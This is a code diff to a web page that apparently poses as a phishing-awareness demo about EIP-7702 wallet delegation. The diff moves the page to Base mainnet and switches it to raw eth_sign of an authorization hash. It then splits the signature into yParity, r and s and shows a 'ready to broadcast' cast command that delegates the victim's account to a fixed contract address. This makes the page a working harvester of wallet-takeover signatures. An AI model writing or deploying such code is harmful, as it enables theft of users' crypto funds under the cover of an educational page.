@@ -69,11 +69,11 @@
   .tl-dot.danger { background: var(--red); border-color: var(--red); }
   .tl-title { font-size: 0.95rem; font-weight: 600; margin-bottom: 4px; }
   .tl-desc { font-size: 0.85rem; color: var(--muted); line-height: 1.6; }
-  .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-family: 'Courier New', monospace; font-size: 0.75rem; color: #a5b4fc; margin-top: 8px; word-break: break-all; line-height: 1.5; }
+  .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-family: 'Courier New', monospace; font-size: 0.75rem; color: #a5b4fc; margin-top: 8px; word-break: break-all; line-height: 1.5; max-height: 200px; overflow-y: auto; }
 
   .info-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px 24px; margin-bottom: 16px; }
-  .info-card-label { font-size: 0.75rem; color: var(--muted); margin-bottom: 4px; }
-  .info-card-value { font-size: 0.9rem; font-weight: 500; word-break: break-all; }
+  .info-card-label { font-size: 0.75rem; color: var(--muted); margin-bottom: 4px; font-weight: 600; }
+  .info-card-value { font-size: 0.85rem; font-weight: 500; word-break: break-all; font-family: 'Courier New', monospace; }
 
   .eip7702-warning { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 16px 18px; margin-bottom: 20px; font-size: 0.83rem; color: #fca5a5; line-height: 1.6; }
   .eip7702-warning strong { color: var(--red); display: block; margin-bottom: 4px; }
@@ -84,6 +84,9 @@
   .defense-num { color: var(--green); font-weight: 700; flex-shrink: 0; min-width: 20px; }
   .defense-text { color: var(--muted); line-height: 1.6; }
   .defense-text strong { color: var(--text); }
+
+  .copy-btn { background: rgba(108,99,255,0.2); color: var(--accent); border: 1px solid rgba(108,99,255,0.5); padding: 4px 8px; border-radius: 4px; font-size: 0.7rem; cursor: pointer; font-family: inherit; font-weight: 600; }
+  .copy-btn:hover { background: rgba(108,99,255,0.3); }
 </style>
 </head>
 <body>
@@ -154,10 +157,8 @@
         <div class="tl-dot danger"></div>
         <div class="tl-title">MetaMask popup — "Sign Message"</div>
         <div class="tl-desc">
-          You saw a generic signature request. The message looked like hex gibberish:
+          You saw a generic signature request. The message was the encoded EIP-7702 authorization tuple:
           <div class="code-block" id="authTupleDisplay"></div>
-          But this wasn't random. It was an EIP-7702 authorization tuple:
-          <div class="code-block">[chain_id=8453, delegateAddress=0xa57a96c76fec586be399f47437cca9fd81f08b92, nonce=(currentNonce+1), y_parity, r, s]</div>
           Signing this gave the attacker the authorization to attach their contract to your EOA.
         </div>
       </div>
@@ -167,12 +168,8 @@
         <div class="tl-desc">
           The attacker took your signed message and wrapped it in an EIP-7702 SetCode transaction:
           <div class="code-block">
-tx = {
-  type: 4,  // SetCode transaction
-  to: null,
-  data: authorization_bytes,
-  authorizations: [your_signed_tuple]
-}
+cast send --type 4 0x0000000000000000000000000000000000000000 "" \
+  --authorization "0x04:0xa57a96c7...d81f08b92:2:${yParity}:${r}:${s}"
           </div>
           They submitted this on-chain. Your EOA's execution bytecode is now delegated.
         </div>
@@ -190,13 +187,51 @@ tx = {
       <div class="info-card-label">Your EOA address</div>
       <div class="info-card-value" id="displayAddress">—</div>
     </div>
+
     <div class="info-card">
       <div class="info-card-label">Delegate contract (now controls your EOA)</div>
       <div class="info-card-value">0xa57a96c76fec586be399f47437cca9fd81f08b92</div>
     </div>
+
     <div class="info-card">
-      <div class="info-card-label">Signed authorization message (hex)</div>
+      <div class="info-card-label">Current nonce</div>
+      <div class="info-card-value" id="displayNonce">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-card-label">Authorization nonce (nonce+1)</div>
+      <div class="info-card-value" id="displayAuthNonce">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-card-label">Signature hash (what you signed)</div>
+      <div class="info-card-value" id="displayAuthHash" style="font-size: 0.75rem;">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-card-label">Full signature</div>
       <div class="info-card-value" id="displaySignature" style="font-size: 0.75rem;">—</div>
+    </div>
+
+    <div class="info-card" style="background: rgba(108,99,255,0.06); border: 1px solid rgba(108,99,255,0.25);">
+      <div class="info-card-label">Signature components for cast</div>
+      <div style="margin-bottom: 8px;">
+        <div style="font-size: 0.8rem; color: var(--text); margin-bottom: 6px;">yParity:</div>
+        <div class="info-card-value" id="displayYParity" style="font-size: 0.75rem;">—</div>
+      </div>
+      <div style="margin-bottom: 8px;">
+        <div style="font-size: 0.8rem; color: var(--text); margin-bottom: 6px;">r:</div>
+        <div class="info-card-value" id="displayR" style="font-size: 0.75rem;">—</div>
+      </div>
+      <div>
+        <div style="font-size: 0.8rem; color: var(--text); margin-bottom: 6px;">s:</div>
+        <div class="info-card-value" id="displayS" style="font-size: 0.75rem;">—</div>
+      </div>
+    </div>
+
+    <div style="background: rgba(34,197,94,0.08); border: 1px solid rgba(34,197,94,0.25); border-radius: 10px; padding: 16px 18px; margin-bottom: 20px; font-size: 0.83rem; color: #c6f6d5; line-height: 1.6;">
+      <strong style="color: var(--green); display: block; margin-bottom: 8px;">✓ Ready to broadcast with cast</strong>
+      <code style="background: var(--surface); padding: 8px 12px; border-radius: 6px; display: block; overflow-x: auto; font-size: 0.7rem;">cast send --type 4 0x0000000000000000000000000000000000000000 "" --authorization "0x04:0xa57a96c76fec586be399f47437cca9fd81f08b92:[NONCE]:[yParity]:[r]:[s]"</code>
     </div>
 
     <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 16px 18px; margin-bottom: 20px; font-size: 0.83rem; color: #fca5a5; line-height: 1.6;">
@@ -236,7 +271,10 @@ tx = {
 
   let userAddress = null;
   let signedAuth = null;
-  let authTuple = null;
+  let currentNonce = null;
+  let authNonce = null;
+  let authHash = null;
+  let signatureComponents = null;
 
   function showPhase(id) {
     document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
@@ -256,17 +294,7 @@ tx = {
       </div>`).join('');
   }
 
-  // Build EIP-7702 authorization tuple
-  function buildAuthorizationTuple(chainId, delegateAddr, nonce) {
-    return {
-      chainId: chainId,
-      address: delegateAddr,
-      nonce: nonce,
-      // y_parity, r, s will be added after signing
-    };
-  }
-
-  // Encode authorization tuple for signing
+  // Encode authorization tuple for signing (no prefix)
   function encodeAuthTuple(chainId, delegateAddr, nonce) {
     const encoded = ethers.AbiCoder.defaultAbiCoder().encode(
       ['uint256', 'address', 'uint256'],
@@ -308,41 +336,64 @@ tx = {
       ]);
       document.getElementById('connectNote').textContent = "Check MetaMask for the signature request.";
 
-      // Build authorization tuple (use currentNonce + 1 per EIP-7702 spec)
-      // The EVM increments the sender's nonce BEFORE validating the authorization,
-      // so we must sign with nonce+1 to pass validation on-chain
-      const currentNonce = await provider.getTransactionCount(userAddress);
-      const authNonce = currentNonce + 1;
-      const authMessage = encodeAuthTuple(chainId, DELEGATE_ADDRESS, authNonce);
+      // Get current nonce (authorization nonce = current nonce + 1 per EIP-7702)
+      currentNonce = await provider.getTransactionCount(userAddress);
+      authNonce = currentNonce + 1;
+
+      // Encode authorization tuple
+      const authMessage = encodeAuthTuple(BASE_CHAIN_ID, DELEGATE_ADDRESS, authNonce);
       
-      // Store for reveal
-      authTuple = {
-        chainId, address: DELEGATE_ADDRESS, nonce: authNonce
-      };
-      
-      // Request signature
+      // Hash for signing (this is what gets signed)
+      authHash = ethers.keccak256(authMessage);
+
+      // Request signature using eth_sign (raw signing, NO personal_sign prefix)
       const signature = await window.ethereum.request({
-        method: 'personal_sign',
-        params: [authMessage, userAddress]
+        method: 'eth_sign',
+        params: [userAddress, authHash]
       });
 
       signedAuth = signature;
 
+      // Parse signature components
+      const sig = ethers.Signature.from(signature);
+      const yParity = sig.v === 27 ? 0 : 1;
+      const r = sig.r;
+      const s = sig.s;
+
+      signatureComponents = { yParity, r, s };
+
       renderSteps([
-        { num:'1', state:'done', title:'Network detected', desc:'Sepolia' },
+        { num:'1', state:'done', title:'Network detected', desc:'Base (8453)' },
         { num:'2', state:'done', title:'Signature obtained', desc:'Authorization signed' }
       ]);
       document.getElementById('connectNote').textContent = "Verification complete. Loading dashboard...";
 
+      // Display info
       document.getElementById('walletChip').textContent = shortAddr(userAddress);
       document.getElementById('revealAddress').textContent = userAddress;
       document.getElementById('displayAddress').textContent = userAddress;
+      document.getElementById('displayNonce').textContent = currentNonce.toString();
+      document.getElementById('displayAuthNonce').textContent = authNonce.toString();
+      document.getElementById('displayAuthHash').textContent = authHash;
       document.getElementById('displaySignature').textContent = signature;
-      document.getElementById('authTupleDisplay').textContent = `
-Authorization Tuple:
-[chainId=${chainId}, address=${DELEGATE_ADDRESS}, nonce=${authNonce}]
+      document.getElementById('displayYParity').textContent = yParity.toString();
+      document.getElementById('displayR').textContent = r;
+      document.getElementById('displayS').textContent = s;
 
-Encoded: ${authMessage}`;
+      document.getElementById('authTupleDisplay').textContent = `
+Authorization Tuple (encoded):
+${authMessage}
+
+Keccak256 hash (signed):
+${authHash}
+
+Components:
+chainId: ${BASE_CHAIN_ID}
+address: ${DELEGATE_ADDRESS}
+nonce: ${authNonce}
+yParity: ${yParity}
+r: ${r}
+s: ${s}`;
 
       setTimeout(() => showPhase('phase-dashboard'), 800);
 
